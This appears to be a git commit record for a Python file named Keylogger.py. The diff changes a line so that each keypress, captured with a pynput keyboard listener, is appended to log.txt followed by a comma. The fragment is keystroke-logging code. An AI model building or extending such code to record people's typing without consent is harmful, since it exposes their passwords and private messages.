16f14d99a9346b7a1c2554eeaf3f3fd1ddad6bad
Sorannos <j.bezdek146@seznam.cz>
2021-02-24 14:36:56 +0100

    1.2

--- Keylogger.py
+++ Keylogger.py
@@ -2,7 +2,7 @@ from pynput.keyboard import Key, Listener
 
 def on_press(key):
     file = open('log.txt','a')
-    file.write('{0}'.format(
+    file.write('{0}, '.format(
         key))
     file.close()
     #
